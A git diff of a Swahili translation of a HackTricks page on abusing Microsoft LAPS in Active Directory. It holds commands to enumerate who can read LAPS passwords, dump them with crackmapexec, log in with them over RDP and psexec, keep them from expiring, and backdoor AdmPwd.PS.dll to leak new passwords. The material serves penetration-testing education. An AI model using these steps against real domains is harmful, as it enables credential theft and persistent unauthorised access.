@@ -75,8 +75,8 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
 ### LAPSToolkit
 
 The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) inarahisisha kuorodhesha LAPS hii kwa kutumia kazi kadhaa.\
-Moja ni kuchambua **`ExtendedRights`** kwa **kompyuta zote zenye LAPS imewezeshwa.** Hii itaonyesha **makundi** yaliyotengwa mahsusi **kusoma nywila za LAPS**, ambayo mara nyingi ni watumiaji katika makundi yaliyolindwa.\
-**Akaunti** ambayo ime **jiunga na kompyuta** kwenye kanda inapata `All Extended Rights` juu ya mwenyeji huo, na haki hii inampa **akaunti** uwezo wa **kusoma nywila.** Kuorodhesha kunaweza kuonyesha akaunti ya mtumiaji ambayo inaweza kusoma nywila ya LAPS kwenye mwenyeji. Hii inaweza kutusaidia **kulenga watumiaji maalum wa AD** ambao wanaweza kusoma nywila za LAPS.
+Moja ni kuchambua **`ExtendedRights`** kwa **kompyuta zote zenye LAPS iliyoanzishwa.** Hii itaonyesha **makundi** yaliyotengwa mahsusi **kusoma nywila za LAPS**, ambayo mara nyingi ni watumiaji katika makundi yaliyolindwa.\
+**Akaunti** ambayo ime **jiunga na kompyuta** kwenye kikoa inapokea `All Extended Rights` juu ya mwenyeji huo, na haki hii inampa **akaunti** uwezo wa **kusoma nywila.** Kuorodhesha kunaweza kuonyesha akaunti ya mtumiaji ambayo inaweza kusoma nywila ya LAPS kwenye mwenyeji. Hii inaweza kutusaidia **kulenga watumiaji maalum wa AD** ambao wanaweza kusoma nywila za LAPS.
 ```powershell
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
@@ -105,13 +105,21 @@ Ikiwa hakuna ufikiaji wa powershell unaweza kutumia haki hii kwa mbali kupitia L
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
-This will dump all the passwords that the user can read, allowing you to get a better foothold with a different user.
+Hii itatoa nywila zote ambazo mtumiaji anaweza kusoma, ikikuruhusu kupata msingi bora na mtumiaji tofauti.
 
+## ** Kutumia Nywila ya LAPS **
+```
+freerdp /v:192.168.1.1:3389  /u:Administrator
+Password: 2Z@Ae)7!{9#Cq
+
+python psexec.py Administrator@web.example.com
+Password: 2Z@Ae)7!{9#Cq
+```
 ## **LAPS Persistence**
 
 ### **Tarehe ya Kuisha**
 
-Once admin, it's possible to **obtain the passwords** and **prevent** a machine from **updating** its **password** by **setting the expiration date into the future**.
+Mara tu unapokuwa admin, inawezekana **kupata nywila** na **kuzuia** mashine isifanye **sasisho** la **nywila** kwa **kueka tarehe ya kuisha katika siku zijazo**.
 ```powershell
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
@@ -126,7 +134,7 @@ Nenosiri bado litarejeshwa ikiwa **admin** atatumia **`Reset-AdmPwdPassword`** c
 
 ### Backdoor
 
-Msimbo wa asili wa LAPS unaweza kupatikana [hapa](https://github.com/GreyCorbel/admpwd), kwa hivyo inawezekana kuweka backdoor katika msimbo (ndani ya `Get-AdmPwdPassword` njia katika `Main/AdmPwd.PS/Main.cs` kwa mfano) ambayo kwa namna fulani itafanya **kuhamasisha nenosiri mpya au kuyahifadhi mahali fulani**.
+Msimbo wa asili wa LAPS unaweza kupatikana [hapa](https://github.com/GreyCorbel/admpwd), kwa hivyo inawezekana kuweka backdoor katika msimbo (ndani ya `Get-AdmPwdPassword` njia katika `Main/AdmPwd.PS/Main.cs` kwa mfano) ambayo kwa namna fulani **itatoa nenosiri mpya au kuyahifadhi mahali fulani**.
 
 Kisha, tu kompilisha `AdmPwd.PS.dll` mpya na uipakie kwenye mashine katika `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (na ubadilishe muda wa mabadiliko).
 
@@ -147,7 +155,7 @@ Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
 * **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
